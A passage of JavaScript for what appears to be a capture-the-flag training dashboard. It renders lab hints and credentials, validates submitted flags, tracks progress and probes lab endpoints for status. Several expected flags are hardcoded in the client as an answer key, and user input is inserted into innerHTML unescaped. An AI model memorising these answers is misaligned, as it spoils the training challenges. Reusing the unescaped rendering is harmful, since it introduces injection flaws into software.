        <div style="display: flex; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 1.25rem;">
            ${lab.owasp.map(o => `<span class="vuln-tag" style="background: rgba(0,240,255,0.1); color: var(--accent); border-color: rgba(0,240,255,0.3); font-weight: 600;">${o}</span>`).join('')}
        </div>

        <h4 style="color: #fff; margin-bottom: 0.35rem; font-size: 0.95rem;">🔑 Default Credentials & Access:</h4>
        <div class="modal-cred-box">${lab.credentials}</div>

        <h4 style="color: #fff; margin-top: 1.25rem; margin-bottom: 0.5rem; font-size: 0.95rem;">💡 Exploitation Hints & Solutions:</h4>
        <div class="modal-hint-box">
            <ul style="margin-left: 1.25rem; line-height: 1.6;">
                ${lab.hints.map(h => `<li>${h}</li>`).join('')}
            </ul>
        </div>

        <div style="margin-top: 2rem; display: flex; justify-content: flex-end; gap: 1rem;">
            <button class="btn-details" onclick="closeModal()">Close</button>
            <a href="${lab.url}" target="_blank" rel="noopener noreferrer" style="background: var(--accent); color: #000; padding: 0.6rem 1.25rem; border-radius: var(--radius-sm); text-decoration: none; font-weight: 700; font-size: 0.85rem; display: inline-flex; align-items: center; gap: 0.5rem;">
                Open Lab (${lab.url}) ↗
            </a>
        </div>
    `;
    labModal.classList.add("open");
};

function closeModal() {
    labModal.classList.remove("open");
}

modalCloseBtn.addEventListener("click", closeModal);
labModal.addEventListener("click", (e) => {
    if (e.target === labModal) closeModal();
});

// Flag Submission
flagForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const input = flagInput.value.trim();
    if (!input) return;

    const POKHARA_FLAGS = ["POKHARA_HTTP_FLAG", "POKHARA_FTP_FLAG", "POKHARA_SMTP_FLAG", "POKHARA_DNS_FLAG"];
    const ANON_FLAGS = ["CTF{smb_4n0nym0us_sh4r3_3xfl_8831}", "CTF{r3d15_un4uth_k3y_dumP_3xpl01t_992}", "CTF{ftp_4n0n_d0wnl04d_pwn3d_1102}"];
    const PRIVESC_FLAGS = ["CTF{l1nux_pr1v3sc_gtf0b1ns_m4st3r_7721}", "CTF{us3r_fl4g_1n1t14l_4cc3ss_5510}"];

    let matchedLab = LABS_DATA.find(l => l.flag === input);
    if (!matchedLab) {
        if (POKHARA_FLAGS.includes(input)) matchedLab = LABS_DATA.find(l => l.id === "ctf-port-scanning");
        else if (ANON_FLAGS.includes(input)) matchedLab = LABS_DATA.find(l => l.id === "ctf-anon-services");
        else if (PRIVESC_FLAGS.includes(input)) matchedLab = LABS_DATA.find(l => l.id === "ctf-linux-privesc");
    }

    if (matchedLab) {
        if (!capturedFlags.includes(input)) {
            capturedFlags.push(input);
            localStorage.setItem("ctf_captured_flags", JSON.stringify(capturedFlags));
            flagFeedback.innerHTML = `<span style="color: var(--accent-emerald);">🎉 Correct flag! You solved: <strong>${matchedLab.name} (${input})</strong></span>`;
        } else {
            flagFeedback.innerHTML = `<span style="color: var(--accent-amber);">⚠️ You have already submitted this flag!</span>`;
        }
        flagInput.value = "";
        renderLabs();
        renderCapturedBadges();
    } else {
        flagFeedback.innerHTML = `<span style="color: var(--accent-rose);">❌ Invalid flag format or incorrect payload. Keep digging!</span>`;
    }
});

resetProgressBtn.addEventListener("click", () => {
    if (confirm("Are you sure you want to reset all captured flags?")) {
        capturedFlags = [];
        localStorage.removeItem("ctf_captured_flags");
        flagFeedback.innerHTML = "";
        renderLabs();
        renderCapturedBadges();
    }
});

function renderCapturedBadges() {
    capturedFlagsList.innerHTML = "";
    if (capturedFlags.length === 0) {
        capturedFlagsList.innerHTML = `<span style="font-size: 0.85rem; color: var(--text-muted);">No flags captured yet. Solve a challenge from the Custom CTF section!</span>`;
        return;
    }

    capturedFlags.forEach(f => {
        const lab = LABS_DATA.find(l => l.flag === f);
        const name = lab ? lab.name : "Unknown Challenge";
        const badge = document.createElement("div");
        badge.className = "captured-badge";
        badge.innerHTML = `<span>🚩</span> <strong>${name}</strong> <code>${f.substring(0, 15)}...</code>`;
        capturedFlagsList.appendChild(badge);
    });
}

function updateFlagCount() {
    const totalCtfChallenges = LABS_DATA.filter(l => l.flag).length;
    flagsCapturedCount.textContent = `${capturedFlags.length} / ${totalCtfChallenges}`;
}

// Connectivity Check Simulation (Probing endpoints)
checkStatusBtn.addEventListener("click", () => {
    checkStatusBtn.textContent = "⏳ Probing Ports...";
    let completed = 0;
    
    LABS_DATA.forEach(lab => {
        const indicator = document.getElementById(`status-${lab.id}`);
        if (!indicator) return;

        // Try pinging image or fetch with short timeout
        const dot = indicator.querySelector(".status-dot");
        const text = indicator.querySelector(".status-text");

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 1200);

        fetch(lab.url, { mode: 'no-cors', signal: controller.signal })
            .then(() => {
                clearTimeout(timeoutId);
                dot.className = "status-dot online";
                text.textContent = `Online (:${lab.port})`;
            })
            .catch(() => {
                clearTimeout(timeoutId);
                dot.className = "status-dot offline";
                text.textContent = `Offline (:${lab.port})`;
            })
            .finally(() => {
                completed++;
                if (completed >= LABS_DATA.length) {
                    checkStatusBtn.textContent = "🔄 Test Connectivity";
                }
            });
    });
});

// Category Filter Handling
filterBtns.forEach(btn => {
    btn.addEventListener("click", () => {
        filterBtns.forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        currentFilter = btn.dataset.filter;
        renderLabs();
    });
});

// Difficulty Filter Handling
diffBtns.forEach(btn => {
    btn.addEventListener("click", () => {
        diffBtns.forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        currentDifficulty = btn.dataset.diff;
        renderLabs();
    });
});

labSearchInput.addEventListener("input", renderLabs);

// Initial Load
document.getElementById("totalLabsCount").textContent = LABS_DATA.length;
renderLabs();
renderCapturedBadges();
